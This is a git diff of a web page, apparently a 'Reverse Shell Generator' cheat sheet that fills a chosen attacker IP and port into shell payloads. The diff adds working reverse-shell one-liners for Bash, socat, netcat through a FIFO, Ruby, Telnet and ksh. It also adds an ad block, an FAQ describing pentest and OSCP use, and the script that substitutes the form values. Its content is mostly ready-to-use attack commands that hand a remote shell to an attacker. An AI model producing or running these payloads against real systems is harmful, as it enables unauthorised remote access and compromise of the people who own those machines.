@@ -35,24 +35,35 @@
         <div class="row">
             <div class="one-half column" style="margin-top: 10%; text-align: justify; text-justify: inter-word;">
                 <h4>Reverse Shell Generator</h4>
-                <p>Welcome to this unique site that allows you to set up values for your reverse shell payloads. Powered by <a href="https://nitesculucian.github.io/" target="_blank">Lucian Nitescu</a>, based on publicly available knowledge. 
+                <p>Welcome to this unique site that allows you to set up values for your reverse shell payloads in a cheat sheet format that can be used in real-life scenarios. Powered by <a href="https://nitesculucian.github.io/" target="_blank">Lucian Nitescu</a>, based on publicly available knowledge. 
+                <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></               script>
+                <!-- shellgenerator -->
+                <ins class="adsbygoogle"
+                     style="display:block"
+                     data-ad-client="ca-pub-0255642880549652"
+                     data-ad-slot="5002385447"
+                     data-ad-format="auto"
+                     data-full-width-responsive="true"></ins>
+                <script>
+                     (adsbygoogle = window.adsbygoogle || []).push({});
+                </script>
             </div>
             <div class="one-half column" style="margin-top: 10%">
                 <form>
                     <div class="six columns">
                         <label for="exampleEmailInput">Local / Attacker IP</label>
-                        <input class="u-full-width" type="text" placeholder="127.0.0.1" value="127.0.0.1" id="IPInput" name="IPInput">
+                        <input class="u-full-width" type="text" placeholder="127.0.0.1" id="IPInput" value="127.0.0.1" name="IPInput">
                     </div>
                     <div class="six columns">
                         <label for="exampleRecipientInput">Local Port</label>
-                        <input class="u-full-width" type="text" placeholder="4444" value="4444" id="PortInput" name="PortInput">
+                        <input class="u-full-width" type="text" placeholder="4444" id="PortInput" value="4444" name="PortInput">
                     </div>
                     <div class="row">
                         <input class="button-primary" type="submit" value="Submit">
                     </div>
                 </form>
                 To launch a local callback server for your shell, use the following example: 
-                <div style="background: #f8f8f8; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%"><span style="color: #19177C">nc</span> <span style="color: #666666">-</span><span style="color: #19177C">nvlp</span> <span style="color: #666666">4444</span></pre></div>
+                <div style="background: #f8f8f8; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%"><span style="color: #19177C">nc</span> <span style="color: #666666">-</span><span style="color: #19177C">nvlp</span> <span id="ncport" style="color: #666666">4444</span></pre></div>
                 For the latest updates, you can see <a href="https://github.com/shellgenerator/shellgenerator.github.io">this link</a>.
 
             </div>
@@ -63,7 +74,7 @@
     <div class="container">
         <div class="row">
             <div class="one-half column" style="word-wrap: break-word">
-                <h5>Bash</h5>
+                <h5>Bash #1</h5>
                 <p>
 <div style="background: #f8f8f8; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%">bash -i &gt;&amp; /dev/tcp/127.0.0.1/4444 0&gt;&amp;1
 </pre></div>
@@ -79,6 +90,49 @@
         </div>
         <hr>
     </div>
+
+
+    <div class="container">
+        <div class="row">
+            <div class="one-half column" >
+                <h5>Bash #2</h5>
+                <p>
+<!-- HTML generated using hilite.me --><div style="background: #f8f8f8; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%">0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/127.0.0.1/4444; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196
+</pre></div>
+                </p>
+            </div>
+            <div class="one-half column" >
+                <h5>Socat</h5>
+                <p>
+<!-- HTML generated using hilite.me --><div style="background: #f8f8f8; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%">socat tcp-connect:127.0.0.1:4444 <span style="color: #008000">exec</span>:sh,pty,stderr,setsid,sigint,sane
+</pre></div>
+                </p>
+            </div>
+        </div>
+        <hr>
+    </div>
+
+
+    <div class="container">
+        <div class="row">
+            <div class="one-half column" >
+                <h5>Netcat without -e</h5>
+                <p>
+<!-- HTML generated using hilite.me --><div style="background: #f8f8f8; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%">touch /tmp/f; rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc 127.0.0.1 4444 &gt; /tmp/f
+</pre></div>
+                </p>
+            </div>
+            <div class="one-half column" >
+                <h5>Ruby</h5>
+                <p>
+<!-- HTML generated using hilite.me --><div style="background: #f8f8f8; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%">ruby <span style="color: #666666">-</span>rsocket <span style="color: #666666">-</span>e <span style="color: #BA2121">&#39;exit if fork;c=TCPSocket.new(&quot;127.0.0.1&quot;,&quot;4444&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;){|io|c.print io.read}end&#39;</span>
+</pre></div>
+                </p>
+            </div>
+        </div>
+        <hr>
+    </div>
+
 
     <div class="container">
         <div class="row">
@@ -100,6 +154,28 @@
         <hr>
     </div>
 
+
+   <div class="container">
+        <div class="row">
+            <div class="one-half column" >
+                <h5>Telnet</h5>
+                <p>
+<!-- HTML generated using hilite.me --><div style="background: #f8f8f8; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%"><span style="color: #19177C">TF</span><span style="color: #666666">=</span><span style="color: #008000; font-weight: bold">$(</span>mktemp -u<span style="color: #008000; font-weight: bold">)</span>; mkfifo <span style="color: #19177C">$TF</span> <span style="color: #666666">&amp;&amp;</span> telnet 127.0.0.1 4444 0&lt;<span style="color: #19177C">$TF</span> | /bin/sh 1&gt;<span style="color: #19177C">$TF</span>
+</pre></div>
+                </p>
+            </div>
+            <div class="one-half column" >
+                <h5>ksh</h5>
+                <p>
+<!-- HTML generated using hilite.me --><div style="background: #f8f8f8; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%">ksh -c <span style="color: #BA2121">&#39;ksh -i &gt; /dev/tcp/127.0.0.1/4444 2&gt;&amp;1 0&gt;&amp;1&#39;</span>
+</pre></div>
+                </p>
+            </div>
+        </div>
+        <hr>
+    </div>
+
+
     <div class="container">
         <div class="row">
             <div class="one-half column" >
@@ -119,7 +195,47 @@
         </div>
         <hr>
     </div>
-
+<div class="container">
+    <div class="row">
+            <center><h5> Frequently Answered Questions </h5></center>
+            <table class="u-full-width">
+                <thead>
+                  <tr>
+                    <th>Question</th>
+                    <th>Response</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  <tr>
+                    <td>Why?</td>
+                    <td>Because it helps me! As a pentester and security expert, I realized how many occasions I screwed up a payload.</td>
+                  </tr>
+                  <tr>
+                    <td>Is this all yours?</td>
+                    <td>No. Thanks to: <a target="blank" href="https://highon.coffee/blog/reverse-shell-cheat-sheet/">highon.coffee</a>; <a target="blank" href="https://gtfobins.github.io/">gtfobins.github.io</a>; <a target="blank" href="https://nitesculucian.github.io/2018/07/15/reverse-shells-cheat-sheet/">nitesculucian.github.io</a>; <a target="blank" href="https://ired.team/offensive-security-experiments/offensive-security-cheetsheets">ired.team</a>!</td>
+                  </tr>
+                  <tr>
+                    <td>Is this comprehensive?</td>
+                    <td>No, and it does not aim for that. On this page, you will actually find payloads that helped me throughout my work and OSCP labs.</td>
+                  </tr>
+                  <tr>
+                    <td>Can I add something?</td>
+                    <td>Yes, just make a push request.</td>
+                  </tr>
+                  <tr>
+                    <td>Why the skeleton framework?</td>
+                    <td>I wanted to give it a try and see if it is up to the task.</td>
+                  </tr>
+                  <tr>
+                    <td>Contact?</td>
+                    <td><a target="blank" href="https://www.linkedin.com/in/luciannitescu/">Linkedin</a> | <a target="blank" href="https://twitter.com/LucianNitescu">Twitter</a> | <a target="blank" href="https://www.facebook.com/nitescu.lucian">Facebook</a> </td>
+                  </tr>
+                </tbody>
+            </table>
+        <div class="one-half column" >
+        </div>
+    </div>
+</div>
 
 </body>
 </html>
@@ -138,24 +254,29 @@
     }
     var queryDict = {}
 location.search.substr(1).split("&").forEach(function(item) {queryDict[item.split("=")[0]] = item.split("=")[1]})
-
-
-
-var regex = /127.0.0.1/g,
-    replacement = sanitiseXSS(queryDict.IPInput);
-var regex2 = /4444/g,
-    replacement2 = sanitiseXSS(queryDict.PortInput);
-
-function replaceText(i,el) {
-    if (el.nodeType === 3) {
-        if (regex.test(el.data)) {
-            el.data = el.data.replace(regex2, replacement2);
-            el.data = el.data.replace(regex, replacement);
-        }
-    } else {
-        $(el).contents().each( replaceText );
+    document.getElementById("IPInput").value = sanitiseXSS(queryDict.IPInput);
+    document.getElementById("PortInput").value = sanitiseXSS(queryDict.PortInput);
+    var span = document.getElementById('ncport');
+    while( span.firstChild ) {
+        span.removeChild( span.firstChild );
     }
-}
+    span.appendChild( document.createTextNode(sanitiseXSS(queryDict.PortInput)) );
+    var regex = /127.0.0.1/g,
+        replacement = sanitiseXSS(queryDict.IPInput);
+    var regex2 = /4444/g,
+        replacement2 = sanitiseXSS(queryDict.PortInput);
+    
+    function replaceText(i,el) {
+        if (el.nodeType === 3) {
+            if (regex.test(el.data)) {
+                el.data = el.data.replace(regex2, replacement2);
+                el.data = el.data.replace(regex, replacement);
+            }
+        } else {
+            $(el).contents().each( replaceText );
+        }
+    }
 
-$('body').each( replaceText );
+    
+    $('body').each( replaceText );
 </script>
